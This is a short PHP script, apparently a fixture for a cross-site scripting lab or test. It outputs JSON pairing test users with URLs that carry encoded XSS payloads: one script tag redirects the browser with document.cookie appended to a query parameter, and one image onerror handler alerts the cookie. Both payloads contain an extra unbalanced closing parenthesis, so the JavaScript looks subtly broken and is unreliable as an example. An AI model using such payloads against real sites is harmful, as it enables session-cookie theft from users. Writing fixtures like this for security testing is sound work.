<?php

echo json_encode([[
    "user" => "test1",
    "url"=>"/index.php?name=".urlencode('<script>location.href="/index.php?c="+escape(document.cookie))</script>'),
],[
    "user" => "test2",
    "url"=>"/index.php?name=".urlencode('<img src="x" onerror=alert(escape(document.cookie))) >'),
]]);